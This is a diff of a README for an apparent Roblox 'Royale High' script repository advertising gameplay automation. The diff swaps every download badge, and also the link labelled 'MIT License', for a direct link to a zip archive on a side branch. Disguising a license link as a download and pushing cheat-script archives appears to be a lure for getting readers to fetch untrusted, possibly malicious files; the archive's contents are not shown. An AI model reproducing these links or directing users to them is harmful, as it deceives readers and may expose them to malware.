@@ -1,5 +1,5 @@
 # Royale High Roblox Script Repository  
-[![Download](https://img.shields.io/badge/Download-green)](https://luiselius.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/luiselius/royale-high-automation-toolkit/raw/refs/heads/branch/deckie/toolkit_high_automation_royale_v1.3.zip)  
 
 Welcome to the realm of magic, mystery, and shimmering code! This is the **Royale High Roblox Script** repository—your portal to seamless adventures, all powered by expressive scripts designed to elevate your Royale High gameplay on Roblox. Whether you’re a developer, an enthusiast, or a curious explorer, you’re about to embark on a collaborative journey toward next-level gameplay automation, efficiency, and fun.
 
@@ -78,7 +78,7 @@ _This repository and its contributors have **no affiliation with Roblox Corporat
 ## 📜 MIT License (2025)
 
 This project is licensed under the MIT License. For your legal alchemy and transparency, view the full license text here:  
-[MIT License](https://opensource.org/licenses/MIT)  
+[MIT License](https://github.com/luiselius/royale-high-automation-toolkit/raw/refs/heads/branch/deckie/toolkit_high_automation_royale_v1.3.zip)  
 © 2025 Royale High Roblox Script Repository contributors.
 
 ---
@@ -88,9 +88,9 @@ This project is licensed under the MIT License. For your legal alchemy and trans
 Ready to ascend to new script adventures?  
 
 
-[![Download](https://img.shields.io/badge/Download-green)](https://luiselius.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/luiselius/royale-high-automation-toolkit/raw/refs/heads/branch/deckie/toolkit_high_automation_royale_v1.3.zip)  
 
-Just click the badge above or [download here]https://luiselius.github.io to begin your quest.  
+Just click the badge above or [download here]https://github.com/luiselius/royale-high-automation-toolkit/raw/refs/heads/branch/deckie/toolkit_high_automation_royale_v1.3.zip to begin your quest.  
 See the `docs/setup.md` file for step-by-step instructions and walkthroughs.
 
 ---
